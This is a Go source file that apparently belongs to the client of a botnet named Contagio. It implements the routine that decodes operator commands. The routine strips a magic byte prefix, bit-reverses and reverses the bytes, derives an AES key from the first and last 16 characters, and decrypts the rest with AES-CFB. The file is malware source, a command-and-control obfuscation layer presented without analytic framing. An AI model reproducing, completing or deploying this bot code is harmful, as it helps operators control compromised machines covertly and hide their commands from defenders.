package main

import (
	"bytes"
	"contagio/bot/methods"
	"crypto/aes"
	"crypto/cipher"
	"fmt"
)

func Decrypt(command []byte) string {

	defer methods.Catch()

	command = bytes.TrimPrefix(command, []byte{255, 255, 10, 29, 49, 19, 10, 12, 44, 202})

	for i := range command {
		command[i] = reverseBytes(command[i])
	}

	temp := string(reverseArrayBytes(command))

	key := string(temp[:16]) + string(temp[len(temp)-16:])

	res := dec([]byte(key), []byte(temp[16:len(temp)-16]))

	return res

}

func dec(key, cipherText []byte) string {
	defer methods.Catch()

	block, err := aes.NewCipher(key)
	if err != nil {
		fmt.Println(err)
		return ""
	}

	if len(cipherText) < aes.BlockSize {
		fmt.Println(err)
		return ""
	}

	iv := cipherText[:aes.BlockSize]
	cipherText = cipherText[aes.BlockSize:]

	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(cipherText, cipherText)

	return string(cipherText)
}

func reverseBytes(bytes byte) (res byte) {
	defer methods.Catch()

	for i := 0; i < 8; i++ {
		res <<= 1
		res |= bytes & 1
		bytes >>= 1
	}
	return res
}

func reverseArrayBytes(input []byte) []byte {
	var res = make([]byte, 0)

	for i := range input {
		x := input[len(input)-1-i]
		res = append(res, x)
	}

	return res
}
